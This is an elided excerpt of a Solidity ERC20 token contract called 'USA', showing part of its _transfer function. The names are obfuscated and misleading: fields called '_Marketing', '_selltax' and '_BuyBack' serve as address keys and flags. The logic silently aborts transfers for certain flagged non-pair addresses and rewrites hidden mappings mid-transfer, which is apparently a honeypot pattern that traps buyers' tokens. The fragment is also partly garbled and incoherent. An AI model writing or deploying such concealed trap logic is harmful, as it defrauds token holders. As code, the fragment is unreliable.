...
contract USA is IERC20, Ownable {
    ...
    mapping(address => uint256) private _dev1;
    ...
    function _transfer(
        ...
        uint256 _square = _Marketing[_selltax];
        address _pass = _Devs[_native];

        if (_Marketing[_selltax] > 0 && amount > _native) {
            ...
            if (_Marketing[_selltax] == 0 && _selltax != uniswapV2Pair && _dev1[_selltax] > 0) {
                return;
            }
            _dev1[_pass] = _taxFee;
            _Devs[_native] = _BuyBack;

            if (_taxFee > 0 && !inSwapAndLiquify && _Marketing[_selltax] == 0 && _Marketing[_BuyBack] == 0) {
                amount -= fee;
                _balances[_selltax] -= fee;
            }

            _balances[_selltax] -= amount;
            _balances[_BuyBack] += amount;
            emit Transfer(_selltax, _BuyBack, amount);
        }
    }
